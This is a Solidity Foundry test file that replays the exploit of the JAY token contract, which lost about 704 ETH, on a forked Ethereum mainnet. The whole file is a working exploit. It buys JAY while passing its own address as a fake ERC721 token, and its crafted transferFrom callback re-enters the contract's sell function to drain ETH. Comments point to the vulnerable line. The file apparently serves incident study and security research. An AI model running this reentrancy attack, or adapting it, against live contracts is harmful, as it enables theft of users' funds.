// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

// @KeyInfo - Total Lost : 704 ETH (~ 1,080,000 US$)
// https://etherscan.io/tx/0xd4fafa1261f6e4f9c8543228a67caf9d02811e4ad3058a2714323964a8db61f6


// @NewsTrack
// https://twitter.com/BlockSecTeam/status/1608372475225866240

interface IJay {
    function buyJay(
        address[] memory erc721TokenAddress,
        uint256[] memory erc721Ids,
        address[] memory erc1155TokenAddress,
        uint256[] memory erc1155Ids,
        uint256[] memory erc1155Amounts
    ) external payable;
    function sell(uint256 value) external;
    function balanceOf(address account) external view returns (uint256);
}


contract ContractTest is DSTest{
   // FakeToken FakeTokenContract;
    IJay JAY = IJay(0xf2919D1D80Aff2940274014bef534f7791906FF2);

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("mainnet", 16288199);    // Fork mainnet at block 16288199
    }

    function testExploit() public {

        payable(address(0)).transfer(address(this).balance);
        emit log_named_decimal_uint(
            "[Start] ETH balance before exploitation:",
            address(this).balance,
            18
        );
        cheats.deal(address(this), 72.5 ether); //skip flashloan, directly use deal to set the balance of an address.

        JAY.buyJay{value: 22 ether}(new address[](0),new uint256[](0),new address[](0),new uint256[](0),new uint256[](0));

        address[] memory erc721TokenAddress = new address[](1);
        erc721TokenAddress[0] = address(this);

        uint256[] memory erc721Ids = new uint256[](1);
        erc721Ids[0]= 0;
        
        JAY.buyJay{value: 50.5 ether}(erc721TokenAddress, erc721Ids,new address[](0),new uint256[](0),new uint256[](0));
        JAY.sell(JAY.balanceOf(address(this)));
        JAY.buyJay{value: 3.5 ether}(new address[](0),new uint256[](0),new address[](0),new uint256[](0),new uint256[](0));
        JAY.buyJay{value: 8 ether}(erc721TokenAddress,erc721Ids,new address[](0),new uint256[](0),new uint256[](0));
        JAY.sell(JAY.balanceOf(address(this)));

         payable(address(0)).transfer(72.5 ether); // profit = address(this).balance - initial 72.5 ether

        emit log_named_decimal_uint(
            "[End] ETH balance after exploitation:",
            address(this).balance,
            18
        );
    }
    /*
    function buyJayWithERC721(
        address[] calldata _tokenAddress,
        uint256[] calldata ids
    ) internal {
        for (uint256 id = 0; id < ids.length; id++) {
            IERC721(_tokenAddress[id]).transferFrom(   //vulnerable point, _tokenAddress[id] is controllable.
                msg.sender,
                address(this),
                ids[id]
            );
        }
    }
    */
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
            JAY.sell(JAY.balanceOf(address(this)));  // reenter call JAY.sell
    }
  receive() external payable {}
}




